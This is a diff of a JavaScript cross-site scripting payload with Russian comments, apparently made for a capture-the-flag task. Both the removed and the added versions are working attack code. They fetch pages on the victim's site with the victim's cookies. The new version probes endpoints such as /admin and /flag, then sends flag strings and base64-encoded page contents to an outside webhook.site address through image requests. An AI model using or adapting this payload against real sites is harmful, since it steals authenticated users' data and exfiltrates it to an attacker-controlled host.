@@ -1,10 +1,44 @@
 <script>
-// Отправляем ВЕСЬ HTML страницы
-fetch(window.location.href, {credentials: 'include'})
-  .then(r => r.text())
-  .then(html => {
-      // Кодируем и отправляем себе
-      var encoded = btoa(html); // в base64
-      window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?page=" + encoded;
-  });
+// Получаем текущий URL целевого сайта (где выполняется XSS)
+var targetUrl = window.location.origin; // основной домен
+
+// Пробуем разные эндпоинты на целевом сайте
+var endpoints = [
+    '/', '/admin', '/flag', '/dashboard', 
+    '/profile', '/user', '/account', '/secret'
+];
+
+// Пробуем каждый эндпоинт
+endpoints.forEach(endpoint => {
+    fetch(targetUrl + endpoint, {
+        credentials: 'include', // включаем куки
+        headers: {
+            'X-Requested-With': 'XMLHttpRequest'
+        }
+    })
+    .then(r => {
+        if(r.ok) return r.text();
+        return 'ERROR: ' + r.status;
+    })
+    .then(html => {
+        // Проверяем есть ли флаг
+        if(html.includes('flag{') || html.includes('FLAG{')) {
+            var flag = html.match(/flag{[^}]+}/i) || html.match(/FLAG{[^}]+}/);
+            if(flag) {
+                // Отправляем флаг
+                var img = new Image();
+                img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?flag=" + encodeURIComponent(flag[0]) + "&from=" + endpoint;
+            }
+        }
+        
+        // Если страница небольшая, отправляем всю
+        if(html.length < 5000) {
+            var img2 = new Image();
+            img2.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?page=" + endpoint + "&data=" + encodeURIComponent(btoa(html));
+        }
+    })
+    .catch(err => {
+        // Игнорируем ошибки
+    });
+});
 </script>
